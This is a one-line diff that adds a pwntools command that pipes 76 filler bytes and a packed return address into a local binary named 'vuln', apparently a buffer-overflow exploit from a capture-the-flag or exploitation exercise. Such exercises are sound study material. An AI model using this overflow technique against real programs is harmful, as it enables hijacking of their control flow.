@@ -1,0 +1,1 @@
+python -c 'from pwn import *; print "A" * 76 + p32(0x080485e6)' | ./vuln
